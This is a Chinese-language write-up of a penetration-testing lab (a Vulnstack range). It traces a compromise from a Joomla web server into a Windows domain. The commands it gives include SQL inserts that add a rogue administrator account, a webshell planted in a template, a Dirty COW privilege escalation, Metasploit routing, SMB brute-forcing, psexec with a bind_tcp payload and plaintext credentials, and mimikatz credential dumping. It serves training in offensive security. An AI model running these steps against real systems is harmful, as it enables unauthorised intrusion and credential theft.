### 环境搭建

将环境从[官网](http://vulnstack.qiyuanxuetang.net/vuln/detail/5/)上下载下来，只需要添加相应的一个VMNET2的网卡，且IP段为`192.168.93.0/24`

需要进入centos重启一下网卡，至少我是这么做的才找到IP。

本文涉及知识点实操练习：[Vulnhub之Joomla](https://www.hetianlab.com/expc.do?ec=ECID2026-aeda-4f39-89ed-c6444fa2bfa2&pk_campaign=freebuf-wemedia)（本节课主要讲解Vulnhub渗透测试实战靶场关于Joomla
CMS的综合渗透练习，通过该实验学习渗透测试的信息收集、漏洞扫描与利用、权限提升，最终获取/root下的flag。）

#### 拓扑图

![新建DOC
文档180.png](https://image.3001.net/images/20210112/1610436484_5ffd4f8427f324fe4a85f.png!small)

### WEB入口

#### 主机发现

    
    
    nmap -sn 192.168.124.0/24
    

![新建DOC
文档219.png](https://image.3001.net/images/20210112/1610436490_5ffd4f8aacb6a4a527ed5.png!small)

#### 端口

    
    
    nmap -sS 192.168.124.16
    

![新建DOC
文档369.png](https://image.3001.net/images/20210112/1610436496_5ffd4f9094ec70fa30aec.png!small)

收集到3个端口，暂不做全部扫描。那就先看下网站首页，如下。

![新建DOC
文档402.png](https://image.3001.net/images/20210112/1610436498_5ffd4f92387c2568aa5fb.png!small)

web站点

是一个joomla的web页面，顺手一个administrator放在url后面，看到后台，看到后台， **看到后台**
。我还是比较乐观的人，总想去尝试尝试一两个弱口令。现实总会给我一记响亮的耳光，失败告终。

![新建DOC
文档510.png](https://image.3001.net/images/20210112/1610436503_5ffd4f97bf228cb0e707e.png!small)

只好掏出dirsearch，然后扫描下目录：

![新建DOC
文档535.png](https://image.3001.net/images/20210112/1610436509_5ffd4f9d33647f41cc85c.png!small)

这是以`php~`结尾的后缀名，应该不会被当成php执行，所以，

![新建DOC
文档568.png](https://image.3001.net/images/20210112/1610436512_5ffd4fa08375def1c49d3.png!small)

这个时候，就可以连接数据库了，那就找密码进后台。

![新建DOC
文档595.png](https://image.3001.net/images/20210112/1610436514_5ffd4fa25f827eef0eede.png!small)

难道还是想我爆破？如果让我爆破，那这必然是个弱口令。先去网上字典，掏出大菠萝(john)就是一顿扫。弹药打完了，发现敌人丝毫不动，那，那宣告失败吧。都说失败是成功的爹。接着换思路，就是在本地搭建一个一模一样的。然后将自己mysql里的password字段复制到目标数据库中去或者添加一个新用户，太懒是原罪。然后，在网上找到直接添加到数据库的方法，在<https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn>

![新建DOC
文档951.png](https://image.3001.net/images/20210112/1610436516_5ffd4fa44c6cb68476a43.png!small)

改成目标机器上的表名就可以了：

    
    
    INSERT INTO `am2zu_users`
       (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)
    VALUES ('Administrator2', 'admin2',
        'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());
    INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)
    VALUES (LAST_INSERT_ID(),'8');
    
    # 这里就是添加了一个admin2的用户，密码为secret
    

![新建DOC
文档1351.png](https://image.3001.net/images/20210112/1610436519_5ffd4fa74618698ec74d9.png!small)

虽然密码格式不一样，但是依然能进后台。

![新建DOC
文档1373.png](https://image.3001.net/images/20210112/1610436523_5ffd4fab0d0592642b873.png!small)

在模板处可以修改网站源代码：Extensions-->Templates，在index.php中插入一句话，保存。

![新建DOC
文档1433.png](https://image.3001.net/images/20210112/1610436526_5ffd4fae17d31e1c5db53.png!small)

![新建DOC
文档1435.png](https://image.3001.net/images/20210112/1610436527_5ffd4faf96a8d242c8717.png!small)

该亮出尚方宝剑——蚁剑了，致命一击进入内网了。然后就翻车了

![新建DOC
文档1467.png](https://image.3001.net/images/20210112/1610436530_5ffd4fb2a705385f15515.png!small)

这，，，原来是被禁用了危险函数，虽然不能执行命令，但是能看到php版本，是php7的。然后发现蚁剑有专门的绕过disable_function的插件，姿势不错，有点狐气。然后针对php7的绕过挨个挨个试。

![新建DOC
文档1572.png](https://image.3001.net/images/20210112/1610436532_5ffd4fb4ef5709312d090.png!small)

绕过了会弹出一个新的交互式shell界面

![新建DOC
文档1595.png](https://image.3001.net/images/20210112/1610436539_5ffd4fbb6b3482a1d67e6.png!small)

### 内网渗透

权限太低，是个www-data的权限。相信经过一番努力使用各种姿势提权，总会绝望的。那就只能是自己没有做好信息收集，找：定时任务、/home、/etc/passwd、网站根目录、/tmp目录。最后在`/tmp/mysql/test.txt`中看到用户名密码

![新建DOC
文档1729.png](https://image.3001.net/images/20210112/1610436542_5ffd4fbe70021206b81bf.png!small)

但是并没有在本机器上发现这个 wwwuser 的用户。索性尝试下，又不犯罪。

![新建DOC
文档1770.png](https://image.3001.net/images/20210112/1610436543_5ffd4fbfa2f924f29a5c5.png!small)

竟然成功了？猜测应该做了转发将http请求转到内网的主机上，有内网就可以继续渗透。

![新建DOC
文档1814.png](https://image.3001.net/images/20210112/1610436544_5ffd4fc0b89adcf971491.png!small)

而使用ssh连接的主机的网卡，有三个，一个连接外网，一个连接内网。

![新建DOC
文档1850.png](https://image.3001.net/images/20210112/1610436549_5ffd4fc5a53a78a39f329.png!small)

然后接着提权这台外网的主机，很顺利，看样子是有备而来。看了下内核为2.6.32 并且是centos的操作系统，直接使用脏牛提权成功。

![新建DOC
文档1919.png](https://image.3001.net/images/20210112/1610436553_5ffd4fc9e1656b7418d99.png!small)

获取一个msf会话，接着渗透。

![获取msf会话](https://image.3001.net/images/20210112/1610436555_5ffd4fcb4d5d604c72c43.png!small)

### 后渗透

添加路由

    
    
    meterpreter > run get_local_subnets
    meterpreter > run autoroute -s 192.168.93.0/255.255.255.0
    

![添加路由](https://image.3001.net/images/20210112/1610436557_5ffd4fcdcc4c66d23b934.png!small)

探测内网主机的存活

    
    
    # 针对windows
    use auxiliary/scanner/smb/smb_version 
    
    # linux 
    use auxiliary/scanner/discovery/arp_sweep  用这个没有探测出windows主机
    

最终所有主机如下

![所有主机](https://image.3001.net/images/20210112/1610436562_5ffd4fd21458588bb42c1.png!small)

三个windows，两个使用ms17-010，未果。都没能得到会话。

![没能得到会话](https://image.3001.net/images/20210112/1610436564_5ffd4fd46574db0592b12.png!small)

啊，这....。最后借鉴了下别人的方法，原来是爆破。字典不够强大，最后还是将密码添加到字典中去了（无可奈何）。假如说我爆破出来了

    
    
    use auxiliary/scanner/smb/smb_login
    
    set SMBUSER administrator
    
    set PASS_FILE /root/桌面/passlist
    

![获取会话](https://image.3001.net/images/20210112/1610436566_5ffd4fd68339c87311d5b.png!small)

获取会话。目前的情况是windows在内网，添加的路由是把攻击机带入到内网，使用reverse_tcp是连接不上了，只能正向连接。

    
    
    use exploit/windows/smb/psexec
    
    set payload windows/x64/meterpreter/bind_tcp
    
    set rhosts 192.168.93.30
    
    set smbuser administrator
    
    set smbpass 123qwe!ASD
    

然后拿到两个会话，这个exploit需要多尝试几次，才行。

![exploit拿到会话](https://image.3001.net/images/20210112/1610436568_5ffd4fd864ffd17da8ec7.png!small)

查看是否在域环境

    
    
    meterpreter > sysinfo
    

![meterpreter
>sysinfo](https://image.3001.net/images/20210112/1610436570_5ffd4fda54079b4dc0251.png!small)

### 拿下域控

在server2008上发现域控登录后的记录，然后使用 mimikatz 获取到明文域控密码。

    
    
    load mimikatz
    
    mimikatz_command -f privilege::debug
    
    mimikatz_command -f sekurlsa::logonPasswords
    

![新建DOC
文档2833.png](https://image.3001.net/images/20210112/1610436572_5ffd4fdc5583399d52ba5.png!small)

得到域管理员账号密码。由于密码的特殊性，尝试使用wmiexec.py一直没成功，两个`!!`在linux是特殊符号，表示重新执行上一条命令。然后通过下面方法拿到shell

当前用户为

![当前用户](https://image.3001.net/images/20210112/1610436575_5ffd4fdfa5828cc17efbc.png!small)

![用户信息](https://image.3001.net/images/20210112/1610436577_5ffd4fe110704f626867d.png!small)

远程连接

    
    
    run post/windows/manage/enable_rdp 
    
    proxychains rdesktop 192.168.93.20
    

![远程链接](https://image.3001.net/images/20210112/1610436581_5ffd4fe5775168f5a4bd2.png!small)

